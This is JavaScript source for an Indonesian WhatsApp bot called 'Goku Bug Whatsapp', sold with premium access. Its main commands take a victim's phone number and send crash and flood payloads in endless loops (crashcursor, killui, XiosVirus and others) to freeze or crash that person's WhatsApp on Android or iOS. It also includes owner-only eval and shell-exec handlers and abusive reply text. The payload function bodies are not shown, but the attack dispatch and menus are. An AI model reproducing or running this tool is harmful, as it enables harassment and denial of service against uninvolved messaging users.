vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:deltaonexi@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/yoshi-xhurayra\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
client.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}




const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

async function downloadMp3 (link) {
try {
client.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
client.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
client.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
client.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}


global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}


const reply = (teks) => { 
client.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "ᯓGoku Bug Whatsapp", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "error", 
"sourceUrl": "https://whatsapp.com/channel/0029Vb2rmpK1XquXWfwsiC1I" }}}, { quoted: m }) }

const reply2 = (teks) => {
client.sendMessage(from, { text : teks }, { quoted : m })
}

function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh'
}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam'
}

switch(command) {
case "hardblank": case"rans-bug": case "autoblank":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 2 menit*
> *📌NOTE* INI BUG HANYA CRASH CHAT + DELAY MAKER
JIKA WA TARGET WA PLAY STORE + BELOM UPDATE BUG BAKAL TEMBUS UI`);
        for (let i = 0; ; i++) {
          await crashcursor(target);
          await crashcursor(target);
          await crashcursor(target);
        }
        break;
case "hardui": case"outwaori": case "gokuv1": 
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 2 menit*
> *📌NOTE* INI BUG HANYA CRASH CHAT + DELAY MAKER
JIKA WA TARGET WA PLAY STORE + BELOM UPDATE BUG BAKAL TEMBUS UI`);
        for (let i = 0; ; i++) {
          await crashcursor(target);
          await crashcursor(target);
          await crashcursor(target);
        }
        break;
case "attackios": case "hardattack": case "iosui": case "invisios":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 2 menit*
> *📌NOTE* JANGAN MENG SALAH GUNAKAN BUG INJ`);
        for (let i = 1; ; i++) {
          await crashcursor(target);
        }
        break;
case "💩": case "🦖": case "👽": case "🥶":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 2 menit*
> *📌NOTE* JANGAN MENG SALAH GUNAKAN BUG INJ`);
        for (let i = 0; ; i++) {
          await crashcursor(target)
        }
        break;
case "🤑": case "🤡": case "😱": case "☠️":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 2 menit*
> *📌NOTE* JANGAN MENG SALAH GUNAKAN BUG INJ`);
        for (let i = 0; ; i++) {
          await crashcursor(target)
          await QDIphone(target);
          await IosMJ(target);
          await CaroUsel2(target);
          await XiosVirus(target);
          await BugDoc3(target);
          await BugDoc4(target);
          await fionexsixfreze(target);
          await func1(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await locasifreeze(target);
          await uilokas(target);
          await func1(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
        }
        break;
case "apaantuh": case "alamak":
        if (!isPremium) return reply(" khusus Premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 10 menit*
> *📌NOTE* INI BUG HANYA CRASH CHAT + DELAY MAKER
JIKA WA TARGET WA PLAY STORE + BELOM UPDATE BUG BAKAL TEMBUS UI`);
        for (let i = 0; ; i++) {
          await crashcursor(target)
          await crashcursor(target)
          await crashcursor(target)
          await whatsappoffcbjirrrr(target);
          await func1(target);
          await fionexsixfreze(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await locasifreeze(target);
          await uilokas(target);
          await func1(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await locasifreeze(target);
          await uilokas(target);
          await func1(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await func1(target);
          await fionexsixfreze(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await locasifreeze(target);
          await uilokas(target);
          await func1(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
        }
        break;
case "csx": case "bokep": case "notresponding": case "x1hit": case "xbug": case "jomok": case "ambatukam": case "rusdi": case "suki":
        if (!isOwner) return reply(" Fitur Ini Khusus Premium Tolol ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 10 menit* 
> *📌NOTE* INI BUG HANYA CRASH CHAT + DELAY MAKER
JIKA WA TARGET WA PLAY STORE + BELOM UPDATE BUG BAKAL TEMBUS UI`);
        for (let i = 0; ; i++) {
          await crashcursor(target);
          await crashcursor(target);
          await crashcursor(target);
          await BugDoc4(target);
          await fionexsixfreze(target);
          await killui(target);
          await fionexsixfreze(target);
          await killui(target);
          await BugDoc3(target);
          await BugDoc4(target);
          await CrashV2(target);
          await CrashV2(target);
          await CrashV2(target);
          await whatsappoffcbjirrrr(target)
          await whatsappoffcbjirrrr(target)
          await BugDoc3(target);
          await BugDoc4(target);
          await BugDoc3(target);
          await BugDoc4(target);
          await fionexsixfreze(target);
          await killui(target);
          await fionexsixfreze(target);
          await killui(target);
          await fionexsixfreze(target);
          await killui(target);
        }
        break;
case "combo": case "bug-ui":
        if (!isPremium) return reply(" Khusus premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 10 menit*
> *📌NOTE* INI BUG HANYA CRASH CHAT + DELAY MAKER
JIKA WA TARGET WA PLAY STORE + BELOM UPDATE BUG BAKAL TEMBUS UI`);
        for (let i = 0; ; i++) {
          await crashcursor(target);
          await crashcursor(target);
          await crashcursor(target);
          await killui(target);
          await CaTaLogCrash(target);
          await whatsappoffcbjirrrr(target);
          await func1(target);
          await CaTaLogCrash(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await CaTaLogCrash(target);
        }
        break;
//case ini buat addfitur. kalau error berarti dongo
case "ransv1": case "ranstamvan-bugv1":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`bug ${prefix+command} berhasil dikirim kenomor tujuan. *jeda minimal 2 menit*`);
        for (let i = 0; ; i++) {
          await crashcursor(target);
          await crashcursor(target);
          await crashcursor(target);
          await killui(target);
          await CaTaLogCrash(target);
          await whatsappoffcbjirrrr(target);
          await uilokas(target);
          await CaTaLogCrash(target);
          await Floods1(target);
        }
        break;
 case 'bug-menu':
await client.sendMessage(m.chat, { react: { text: "☕",key: m.key,}})
await client.sendMessage(m.chat, { react: { text: "🇮🇩",key: m.key,}})
          let manhwaa = ` 👋 Halo *${m.pushName}* ,I am the *Whatsapp Bot* Created by Petra Infernox 
Thanks To Support Ranstamvan
Thanks To Support Kahfimoodtzy

╭─▸ *Bug Ios*
│
│⎘ attackios *628###*
│⎘ hardattack *628###*
│⎘ iosui *628###*
│⎘ invisios *628###*
│
╰────────────˧
╭─▸ *Bug Ios*
│
│⎘ 🥶 *628###*
│⎘ 🤡 *628###*
│⎘ ☠️ *628###*
│⎘ 🦖 *628###*
│⎘ 💩 *628###*
│⎘ 👽 *628###*
│⎘ 🤑 *628###*
╰────────────˧
╭─▸ *Bug Andro*
│⎘ gokuv1 *628###*
│⎘ outwaori *628###*
│⎘ hardui *628###*
│⎘ hardblank *628###*
│⎘ autoblank *628###*
╰────────────˧
╭─▸ *Bug in place*
│
│⎘ oyy *ketik ditempat*
│⎘ halowak 
│⎘ hai
╰────────────˧
> THANKS TO SUPPORT PETRA HOSTING
jam ${timee}
 `
      client.sendMessage(m.chat, {audio: fs.readFileSync('./goku-is-here.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
      client.sendMessage(m.chat, {
      video: fs.readFileSync('./rog.mp4'),
      gifPlayback: true,
      caption: manhwaa,
      contextInfo: {
      externalAdReply: {
      title: 'GOKU CRASH WHATSAPP',
      body: 'fuck the whatsapp system ',
      thumbnailUrl: 'https://img101.pixhost.to/images/369/551688484_skyzopedia.jpg',
      sourceUrl: "https://whatsapp.com/channel/0029Vb2rmpK1XquXWfwsiC1I",
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      
      
}) 

break
case 'tqto':
await client.sendMessage(m.chat, { react: { text: "🐥",key: m.key,}})
                let manhwaaa = `👋 *Halo* ${m.pushName}, Ini adalah fitur Thanks to
> *☴ THANKS TO*
⌥ Petra (Dev)
⌥ Kahfi (my friend) 
⌥ Ranstamvan (my friend) 
⌥ All Buyer sc
 `
      client.sendMessage(m.chat, {audio: fs.readFileSync('./goku-is-here.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
      client.sendMessage(m.chat, {
      video: fs.readFileSync('./rog.mp4'),
      gifPlayback: true,
      caption: manhwaaa,
      contextInfo: {
      externalAdReply: {
      title: 'GOKU CRASH WHATSAPP',
      body: 'fuck the whatsapp system ',
      thumbnailUrl: 'https://img101.pixhost.to/images/369/551688484_skyzopedia.jpg',
      sourceUrl: "https://whatsapp.com/channel/0029Vb2rmpK1XquXWfwsiC1I",
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      
      
}) 
                
break;
case 'menu':
await client.sendMessage(m.chat, { react: { text: "⚡",key: m.key,}})
                let manhwaaaa = ` 👋 Halo *${m.pushName}* ,I am the *Whatsapp Bot* Created by Petra Infernox Thanks Support AllwaysAqioo
                
<+> Informasi
<#> Owner : petra
<#> Bot : Goku v1
<#> Version : Goku v1
<#> Developer : petra
<#> Supoort : ranstamvan
<#> Supoort : kahfi
#───────────────────#
<!> Saya adalah robot whatsapp yang dibuat oleh Petra dengan codingan java script

<!> Ketik tqto (\`untuk menampilkan yg telah support script ini\`)

<!> Ketik bug-menu (\`untuk memunculkan semua jenis bug menu\`)
 `
      client.sendMessage(m.chat, {audio: fs.readFileSync('./goku-is-here.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
      client.sendMessage(m.chat, {
      video: fs.readFileSync('./rog.mp4'),
      gifPlayback: true,
      caption: manhwaaaa,
      contextInfo: {
      externalAdReply: {
      title: 'GOKU CRASH WHATSAPP',
      body: 'fuck the whatsapp system ',
      thumbnailUrl: 'https://img101.pixhost.to/images/369/551688484_skyzopedia.jpg',
      sourceUrl: "https://whatsapp.com/channel/0029Vb2rmpK1XquXWfwsiC1I",
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      
}) 
                
break;
case 'oyy': case 'halowak': case 'hai': {
if (!isBot) return reply(" khusus bot doang ")
async function mennuu () {
var clientloading = [
"1",
"2",
"3",
"BOOM", 
"DONE C1"
]
let { key } = await client.sendMessage(m.chat, {text: 'Crash Sent'})
for (let i = 0; i < clientloading.length; i++) {
await client.sendMessage(m.chat, {text: clientloading[i], edit: key });
}
}
await mennuu()
          await crashcursor(m.chat);
          await crashcursor(m.chat);
          await crashcursor(m.chat);
          await killui(m.chat);
          await uilokas(m.chat);
          await Floods1(m.chat);
          await Floods2(m.chat);
          await Floods3(m.chat);
          await killui(m.chat);
          await fionexsixfreze(m.chat);
          await killui(m.chat);
          await CaTaLogCrash(m.chat);
          await BugDoc4(m.chat);
          await fionexsixfreze(m.chat);
          await killui(m.chat);
          await fionexsixfreze(m.chat);
          await killui(m.chat);
          await BugDoc3(m.chat);
          await BugDoc4(m.chat);
          await CrashV2(m.chat);
          await CrashV2(m.chat);
          await CrashV2(m.chat);
          await whatsappoffcbjirrrr(m.chat)
          await whatsappoffcbjirrrr(m.chat)
          await BugDoc3(m.chat);
          await BugDoc4(m.chat);
          await BugDoc3(m.chat);
          await BugDoc4(m.chat);
          await fionexsixfreze(m.chat);
          await killui(m.chat);
          await fionexsixfreze(m.chat);
          await killui(m.chat);
          await fionexsixfreze(m.chat);
          await killui(m.chat);
}
break

case "hidetag": case "z": case "h": {
if (!isPremium) return reply(" maaf kamu tidak memiliki akses ")
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
client.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "public": {
if (!isOwner) return reply(" Fitur Ini Khusus Owner Tolol ")
client.public = true
reply(`*berhasil mengubah bot ke mode public*`)
}
break
case "self": {
if (!isOwner) return reply(" Fitur Ini Khusus Owner Tolol ")
client.public = false
reply(`*berhasil mengubah bot ke mode self*`)
}
break

case 'addprem':
if (!isOwner) return reply(" Fitur Ini KKhususOwner Tolol ")
if (!args[0]) return reply(`Use ${prefix+command} number\nContoh ${prefix+command} 628xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`${prrkek} jan sembarangan bug kalo udh premium kontol`)
break
case 'delprem':
if (!isOwner) return reply(" Fitur Ini Khusus Owner Tolol ")
if (!args[0]) return reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`WOI ${ya} MAMPUS KONTOL DI DELPREM`)
break
case 'addown': {
if (!isOwner) return reply(" Fitur Ini Khusus Owner Tolol ");
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 62xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukan Nomor Yang Sudah Terdaftar Di Whatsapp!!!`)
owner.push(prrkek)
fs.writeFileSync('./owner.json', JSON.stringify(owner))
reply(`Nomor ${prrkek} Sudah Menjadj Owner!!!`)
}
break
case 'delown': {
if (!isOwner) return reply(" Fitur Ini Khusus Owner Tolol ");
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Sudah Bukan Owner!!!`)
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})